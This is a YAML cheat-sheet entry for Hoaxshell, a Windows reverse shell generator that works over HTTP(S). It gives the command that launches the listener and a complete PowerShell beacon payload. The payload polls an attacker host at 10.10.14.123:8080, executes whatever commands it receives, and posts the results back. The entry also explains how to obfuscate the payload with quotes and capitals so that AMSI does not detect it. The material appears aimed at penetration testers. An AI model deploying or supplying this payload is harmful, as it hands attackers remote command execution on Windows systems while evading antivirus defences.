---
description: |
  Hoaxshell est un générateur de reverse shell payload pour Windows qui abuse du protocole http(s) pour établir un shell inversé de type balise. Sachez que le payload par défaut est détectée par AMSI, il faut donc l'obscurcir avec des guillemets et des majuscules et vérifier si elle est compatible avec AmsiTrigger.

  Command Reference:

    IP address of attacking machine: 10.10.21.14

    -H: standard or custom http header name to avoid detection

command: |
  python3 hoaxshell.py -s 10.10.14.123 -r -H "Authorization"

code: |
  Obfucate the generated payload, by adding quotes and capitals, and check against AmsiTrigger:

  $s='10.10.14.123:8080';$i='a057fd22-2e58ab4e-cdf23a08';$p='http://';$v=Invoke-Web''Request -UseBasicParsing -Uri $p$s/a057fd22 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -USEBasicParsing -Uri $p$s/2e58ab4e -Headers @{"Authorization"=$i}).Content;if ($c -ne 'None') {$r=i''ex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/cdf23a08 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}


items:
  - Shell
services:
  - 
OS:
  - Windows
  - Approved-tool
attack_types:
  - Persistence
  - Injection
  - Bypassing
references:
  - https://github.com/t3l3machus/hoaxshell
  - https://m.youtube.com/watch?v=fgSARG82TJY
  - https://github.com/RythmStick/AMSITrigger

---